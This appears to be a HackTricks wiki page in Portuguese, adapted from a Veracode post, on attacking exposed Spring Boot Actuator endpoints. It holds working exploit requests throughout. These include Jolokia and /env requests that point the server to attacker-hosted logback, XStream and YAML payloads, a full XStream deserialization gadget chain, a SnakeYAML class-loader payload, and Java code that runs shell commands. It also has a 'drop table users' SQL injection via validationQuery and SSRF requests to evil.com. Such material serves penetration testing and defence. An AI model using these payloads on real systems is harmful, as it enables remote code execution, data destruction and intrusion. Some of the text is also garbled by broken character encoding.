# Spring Actuators

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**De** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Explorando Spring Boot Actuators

**copiado de** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

O Framework Spring Boot inclui uma s√©rie de recursos chamados actuators para ajud√°-lo a monitorar e gerenciar sua aplica√ß√£o web quando voc√™ a coloca em produ√ß√£o. Destinados a serem usados para auditoria, sa√∫de e coleta de m√©tricas, eles tamb√©m podem abrir uma porta oculta para o seu servidor quando mal configurados.

Quando uma aplica√ß√£o Spring Boot est√° em execu√ß√£o, ela automaticamente registra v√°rios endpoints (como '/health', '/trace', '/beans', '/env', etc) no processo de roteamento. Para o Spring Boot 1 - 1.4, eles s√£o acess√≠veis sem autentica√ß√£o, causando problemas significativos com seguran√ßa. A partir da vers√£o 1.5 do Spring, todos os endpoints, exceto '/health' e '/info', s√£o considerados sens√≠veis e protegidos por padr√£o, mas essa seguran√ßa √© frequentemente desativada pelos desenvolvedores da aplica√ß√£o.

Os seguintes endpoints do Actuator podem potencialmente ter implica√ß√µes de seguran√ßa levando a poss√≠veis vulnerabilidades:

* /dump - exibe um dump de threads (incluindo um rastreamento de pilha)
* /trace - exibe as √∫ltimas mensagens HTTP (que podem incluir identificadores de sess√£o)
* /logfile - exibe o conte√∫do do arquivo de log
* /shutdown - desliga a aplica√ß√£o
* /mappings - mostra todos os mapeamentos do controlador MVC
* /env - fornece acesso ao ambiente de configura√ß√£o
* /actuator/env
* /restart - reinicia a aplica√ß√£o
* /heapdump - Constr√≥i e retorna um dump de heap da JVM usada pela nossa aplica√ß√£o

Para o Spring 1x, eles s√£o registrados sob a URL raiz, e no 2x eles foram movidos para o caminho base "/actuator/".

**Explora√ß√£o:**

A maioria dos actuators suporta apenas solicita√ß√µes GET e simplesmente revela dados de configura√ß√£o sens√≠veis, mas v√°rios deles s√£o particularmente interessantes para ca√ßadores de shell:

**1. Execu√ß√£o Remota de C√≥digo via '/jolokia'**

Se a Biblioteca Jolokia est√° no classpath da aplica√ß√£o alvo, ela √© automaticamente exposta pelo Spring Boot sob o endpoint do actuator '/jolokia'. Jolokia permite acesso HTTP a todos os MBeans registrados e √© projetado para realizar as mesmas opera√ß√µes que voc√™ pode executar com JMX. √â poss√≠vel listar todas as a√ß√µes dos MBeans dispon√≠veis usando a URL:

[**http://127.0.0.1:8090/jolokia/list**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Novamente, a maioria das a√ß√µes dos MBeans apenas revela alguns dados do sistema, mas uma √© particularmente interessante:

![reloadByURL](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_jolokia.png)

A a√ß√£o '**reloadByURL**', fornecida pela biblioteca Logback, nos permite recarregar a configura√ß√£o de log de uma URL externa. Pode ser acionada simplesmente navegando para:[**http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Ent√£o, por que dever√≠amos nos preocupar com a configura√ß√£o de log? Principalmente por duas coisas:

1. A configura√ß√£o tem um formato XML, e claro, o Logback a analisa com Entidades Externas habilitadas, portanto √© vulner√°vel a XXE cego.
2. A configura√ß√£o do Logback tem o recurso ['Obtendo vari√°veis do JNDI'](https://logback.qos.ch/manual/configuration.html#insertFromJNDI). No arquivo XML, podemos incluir uma tag como '**\<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />**' e o atributo name ser√° passado para o m√©todo DirContext.lookup(). Se pudermos fornecer um nome arbitr√°rio para a fun√ß√£o .lookup(), nem precisamos de XXE ou HeapDump porque isso nos d√° uma **Execu√ß√£o Remota de C√≥digo** completa.

**Como funciona:**

1\. Um atacante solicita a URL mencionada para executar a fun√ß√£o 'reloadByURL', fornecida pela classe 'qos.logback.classic.jmx.JMXConfigurator'.

2\. A fun√ß√£o 'reloadByURL' baixa uma nova configura√ß√£o de [http://artsploit.com/logback.xml](http://artsploit.com/logback.xml) e a analisa como uma configura√ß√£o Logback. Esta configura√ß√£o maliciosa deve ter o seguinte conte√∫do:
```
<configuration>
<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. Quando esse arquivo √© processado no servidor vulner√°vel, ele cria uma conex√£o com o servidor LDAP controlado pelo atacante especificado no valor do par√¢metro "env-entry-name", o que leva √† resolu√ß√£o JNDI. O servidor LDAP malicioso pode retornar um objeto do tipo 'Reference' para acionar uma **execu√ß√£o do bytecode fornecido** na aplica√ß√£o alvo. Ataques JNDI s√£o bem explicados neste [artigo de pesquisa da MicroFocus](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf). A [nova t√©cnica de explora√ß√£o JNDI](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) (descrita anteriormente em nosso blog) tamb√©m funciona aqui, j√° que o Tomcat √© o servidor de aplica√ß√£o padr√£o no Spring Boot Framework.

**2. Modifica√ß√£o de configura√ß√£o via '/env'**

Se as Bibliotecas Spring Cloud est√£o no classpath, o endpoint **'/env'** permite modificar as propriedades ambientais do Spring. Todos os beans anotados como '**@ConfigurationProperties**' podem ser modificados e reassociados. Muitas, mas n√£o todas, propriedades que podemos controlar est√£o listadas no endpoint do atuador '/configprops'. Na verdade, h√° toneladas delas, mas absolutamente n√£o est√° claro o que precisamos modificar para alcan√ßar algo. Depois de passar alguns dias brincando com elas, descobrimos isso:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
Esta propriedade modifica o serviceURL do Eureka para um valor arbitr√°rio. O Eureka Server √© normalmente utilizado como um servidor de descoberta, e quase todas as aplica√ß√µes Spring Cloud se registram nele e enviam atualiza√ß√µes de status. Se tiver sorte de ter Eureka-Client <1.8.7 no classpath do alvo (normalmente inclu√≠do no Spring Cloud Netflix), voc√™ pode explorar a **vulnerabilidade de deserializa√ß√£o XStream** nele. Tudo o que precisa fazer √© definir a propriedade 'eureka.client.serviceUrl.defaultZone' para a URL do seu servidor ( [http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)) atrav√©s de '/env' e depois chamar o endpoint '/refresh'. Ap√≥s isso, o seu servidor deve servir o payload XStream com o seguinte conte√∫do:
```markup
<linked-hash-set>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>
<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
</command>
<redirectErrorStream>false</redirectErrorStream>
</next>
</iter>
<filter class="javax.imageio.ImageIO$ContainsFilter">
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>foo</name>
</filter>
<next class="string">foo</next>
</serviceIterator>
<lock/>
</cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer>
</is>
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
Este payload XStream √© uma vers√£o ligeiramente modificada da cadeia de gadgets ImageIO JDK-only do [Marshalsec research](https://github.com/mbechler/marshalsec). A √∫nica diferen√ßa aqui √© o uso de **LinkedHashSet** para acionar o m√©todo 'jdk.nashorn.internal.objects.NativeString.hashCode()'. O payload original utiliza java.lang.Map para alcan√ßar o mesmo comportamento, mas a configura√ß√£o XStream do Eureka tem um [conversor personalizado para mapas](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58) que o torna inutiliz√°vel. O payload acima n√£o usa Maps de forma alguma e pode ser usado para alcan√ßar Execu√ß√£o Remota de C√≥digo sem restri√ß√µes adicionais.

Usando Spring Actuators, voc√™ pode realmente explorar essa vulnerabilidade mesmo que n√£o tenha acesso a um servidor Eureka interno; voc√™ s√≥ precisa de um ponto de extremidade "/env" dispon√≠vel.

**Outras configura√ß√µes √∫teis:**

**spring.datasource.tomcat.validationQuery=drop+table+users** - permite especificar qualquer consulta SQL, e ela ser√° automaticamente executada contra o banco de dados atual. Pode ser qualquer instru√ß√£o, incluindo insert, update ou delete.

![Explorando Spring Boot Actuators Drop Table](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_drop_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - permite modificar a string de conex√£o JDBC atual.

A √∫ltima parece √≥tima, mas o problema √© quando a aplica√ß√£o que executa a conex√£o com o banco de dados j√° est√° estabelecida, apenas atualizar a string JDBC n√£o tem efeito. Felizmente, h√° outra propriedade que pode nos ajudar neste caso:

**spring.datasource.tomcat.max-active**=777

O truque que podemos usar aqui √© aumentar o n√∫mero de conex√µes simult√¢neas ao banco de dados. Assim, podemos alterar a string de conex√£o JDBC, aumentar o n√∫mero de conex√µes e, ap√≥s isso, enviar muitas solicita√ß√µes √† aplica√ß√£o para simular uma carga pesada. Sob a carga, a aplica√ß√£o criar√° uma nova conex√£o com o banco de dados com a string JDBC maliciosa atualizada. Testei esta t√©cnica localmente contra o Mysql e funciona perfeitamente.

![Explorando Spring Boot Actuators Max Active](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_max_active.png)

Al√©m disso, h√° outras propriedades que parecem interessantes, mas, na pr√°tica, n√£o s√£o realmente √∫teis:

**spring.datasource.url** - string de conex√£o com o banco de dados (usada apenas para a primeira conex√£o)

**spring.datasource.jndiName** - string JNDI de bancos de dados (usada apenas para a primeira conex√£o)

**spring.datasource.tomcat.dataSourceJNDI** - string JNDI de bancos de dados (n√£o usada de todo)

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - URL de configura√ß√£o do spring cloud (n√£o tem efeito ap√≥s o in√≠cio do app, apenas os valores iniciais s√£o usados.)

Essas propriedades n√£o t√™m efeito a menos que o ponto de extremidade '/restart' seja chamado. Este ponto de extremidade reinicia todos os ApplicationContext, mas est√° desativado por padr√£o.

H√° muitas outras propriedades interessantes, mas a maioria delas n√£o tem efeito imediato ap√≥s a mudan√ßa.

**N.B.** No Spring Boot 2x, o formato de solicita√ß√£o para modificar propriedades via o ponto de extremidade '/env' √© ligeiramente diferente (usa formato json), mas a ideia √© a mesma.

**Um exemplo do aplicativo vulner√°vel:**

Se voc√™ quiser testar essa vulnerabilidade localmente, criei um [aplicativo simples Spring Boot na minha p√°gina do Github](https://github.com/artsploit/actuator-testbed). Todos os payloads devem funcionar l√°, exceto pelas configura√ß√µes do banco de dados (a menos que voc√™ o configure).

**Descoberta de caixa preta:**

Uma lista completa de actuators padr√£o pode ser encontrada aqui: [https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt). Tenha em mente que os desenvolvedores de aplicativos podem criar seus pr√≥prios pontos de extremidade usando a anota√ß√£o @Endpoint.

**Atualiza√ß√£o de maio de 2019:**

H√° uma maneira mais confi√°vel de alcan√ßar RCE por meio de uma modifica√ß√£o das propriedades ambientais do Spring:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
Esta solicita√ß√£o modifica a propriedade 'spring.cloud.bootstrap.location', que √© usada para carregar configura√ß√µes externas e analis√°-las no formato YAML. Para que isso ocorra, tamb√©m precisamos chamar o endpoint '/refresh'.
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
```markdown
Quando a configura√ß√£o YAML √© obtida do servidor remoto, ela √© analisada com a biblioteca SnakeYAML, que tamb√©m √© suscet√≠vel a ataques de deserializa√ß√£o. O payload (yaml-payload.yml) pode ser gerado usando a pesquisa Marshalsec mencionada:
```
```
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
]]
]
```
A deserializa√ß√£o deste arquivo aciona a execu√ß√£o do construtor do 'ScriptEngineManager' com o 'URLClassLoader' fornecido. Resumidamente, isso leva ao m√©todo **'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)'**, que tenta encontrar todas as implementa√ß√µes da interface 'ScriptEngineFactory' em todas as bibliotecas no classpath. Como podemos adicionar uma nova biblioteca via 'URLClassLoader', podemos servir uma nova 'ScriptEngineFactory' com o bytecode malicioso dentro. Para fazer isso, precisamos criar um arquivo jar com os seguintes arquivos obrigat√≥rios: [yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java) deve conter o bytecode real, com o payload malicioso no construtor.
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```
```markdown
[yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory) deve ser apenas um arquivo de texto contendo uma refer√™ncia completa para 'artsploit.AwesomeScriptEngineFactory', para que o ServiceLoader saiba onde encontrar a classe: **artsploit.AwesomeScriptEngineFactory** Novamente, esta t√©cnica de explora√ß√£o requer que o spring cloud esteja no classpath, mas, em compara√ß√£o com o payload XStream do Eureka, funciona at√© na vers√£o mais recente. Voc√™ pode encontrar o payload completo no meu projeto do github: [yaml-payload](https://github.com/artsploit/yaml-payload).

## Env + H2 RCE

Veja esta p√°gina para descobrir como explorar a combina√ß√£o /env + H2: [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## SSRF no Spring Boot Atrav√©s de Interpreta√ß√£o Incorreta do Caminho <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

[**Desta pesquisa**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation): O framework Spring aceita o caractere separador de par√¢metros de matriz `;` antes da primeira barra do caminho HTTP:
```
```http
GET ;1337/api/v1/me HTTP/1.1
Host: target.com
Connection: close
```
Em um cen√°rio como o seguinte:

<figure><img src="../../.gitbook/assets/image (717).png" alt="" width="563"><figcaption></figcaption></figure>

Considerando que o Spring permite qualquer caractere ap√≥s o separador de par√¢metros Matrix, torna-se poss√≠vel usar o caractere `@` para buscar um endpoint arbitr√°rio tamb√©m.

Abaixo est√° um exemplo da requisi√ß√£o de explora√ß√£o:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
## Mais Informa√ß√µes

* [https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html](https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html)
* [https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators](https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators)
* [https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep](https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep)

<details>

<summary><strong>Aprenda AWS hacking do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
